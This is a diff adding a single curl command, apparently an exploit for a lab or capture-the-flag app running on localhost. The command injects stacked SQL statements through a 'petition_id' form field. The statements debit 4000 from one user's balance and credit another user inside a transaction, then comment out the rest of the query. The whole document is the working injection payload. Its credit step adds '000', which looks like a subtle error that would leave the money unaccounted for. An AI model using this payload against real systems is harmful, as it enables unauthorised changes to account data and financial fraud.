@@ -1,0 +1,17 @@
+curl -X POST http://127.0.0.1:8000/api/v2/legacy_mark_reviewed_77x9a \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode "petition_id=1;
+BEGIN IMMEDIATE;
+
+UPDATE users
+SET balance = balance - 4000
+WHERE username = 'lucia'
+  AND balance >= 4000
+  AND EXISTS (SELECT 1 FROM users WHERE username = 'martin');
+
+UPDATE users
+SET balance = balance + 000
+WHERE username = 'martin'
+  AND changes() = 1;
+
+COMMIT; --"
